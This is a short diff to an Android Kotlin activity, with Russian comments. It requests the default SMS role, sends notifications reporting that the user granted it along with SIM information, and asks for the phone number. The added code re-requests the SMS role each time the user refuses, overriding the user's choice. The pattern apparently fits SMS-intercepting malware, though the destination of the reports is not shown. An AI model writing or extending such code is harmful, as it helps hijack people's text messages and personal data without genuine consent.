@@ -64,6 +64,10 @@ class MainActivity : AppCompatActivity() {
             if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                 sendSimInfoNotification()
             }
+            
+            if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
+                showPhoneNumberDialog()
+            }
         }
     }
 
@@ -95,6 +99,7 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SMS_ROLE_REQUEST_CODE) {
             if (isDefaultSmsApp()) {
+                // Пользователь предоставил разрешение
                 if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                     sendNotification("Пользователь сделал приложением по умолчанию")
                     sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
@@ -103,10 +108,12 @@ class MainActivity : AppCompatActivity() {
                     sendSimInfoNotification()
                 }
                 
-                // Показываем диалог ввода номера, если он еще не был введен
                 if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                     showPhoneNumberDialog()
                 }
+            } else {
+                // Пользователь отказал - запрашиваем снова
+                requestSmsRole()
             }
         }
     }
